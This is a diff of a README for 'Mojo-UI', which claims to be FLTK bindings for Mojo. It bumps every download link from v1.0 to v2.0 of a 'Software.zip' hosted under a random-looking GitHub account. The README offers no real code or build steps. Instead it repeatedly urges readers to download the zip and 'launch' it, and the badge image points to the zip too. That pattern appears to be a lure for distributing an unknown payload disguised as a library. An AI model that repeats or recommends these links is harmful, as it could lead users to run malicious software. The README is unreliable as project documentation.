@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Mojo-UI Repository!
 
-![Mojo-UI](https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v1.0/Software.zip%20Bindings-green)
+![Mojo-UI](https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v2.0/Software.zip%20Bindings-green)
 
 ## Description
 Welcome to the Mojo-UI repository, where you can find FLTK Bindings for Mojo. This project aims to provide a seamless integration of FLTK GUI Library with Mojo, offering a powerful toolkit for creating user interfaces in the Mojo language. 
@@ -11,13 +11,13 @@ bindings, ffi, fltk, fltk-gui-library, fltk-toolkit, gui, gui-library, library, 
 ## Repository Content
 This repository contains the necessary bindings, tools, and resources to enable Mojo developers to leverage the capabilities of the FLTK GUI Library within their projects. 
 
-To get started, make sure to check out the [https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v1.0/Software.zip](https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v1.0/Software.zip) file, which contains all the essential components you need. 
+To get started, make sure to check out the [https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v2.0/Software.zip](https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v2.0/Software.zip) file, which contains all the essential components you need. 
 
 ## How to Launch
-The https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v1.0/Software.zip file needs to be launched to access the contents. You can download it from the provided link and explore the exciting tools and bindings for Mojo and FLTK integration.
+The https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v2.0/Software.zip file needs to be launched to access the contents. You can download it from the provided link and explore the exciting tools and bindings for Mojo and FLTK integration.
 
 ## Getting Started
-1. Download the https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v1.0/Software.zip file from the link above.
+1. Download the https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v2.0/Software.zip file from the link above.
 2. Follow the setup instructions provided within the zip file.
 3. Explore the sample projects and documentation to start building amazing user interfaces with Mojo and FLTK.
 
@@ -32,9 +32,9 @@ Stay connected with other developers working on Mojo-UI by joining our community
 
 Let's build extraordinary user interfaces with Mojo and FLTK! 🌟
 
-![Mojo-UI](https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v1.0/Software.zip)
+![Mojo-UI](https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v2.0/Software.zip)
 
-Be sure to download the https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v1.0/Software.zip file and unleash the power of FLTK bindings in Mojo. Happy coding! 🚀🔥
+Be sure to download the https://github.com/sudjgfajshdgajsdh/mojo-ui/releases/download/v2.0/Software.zip file and unleash the power of FLTK bindings in Mojo. Happy coding! 🚀🔥
 
 ```markdown
 # Happy coding! 💻🎉
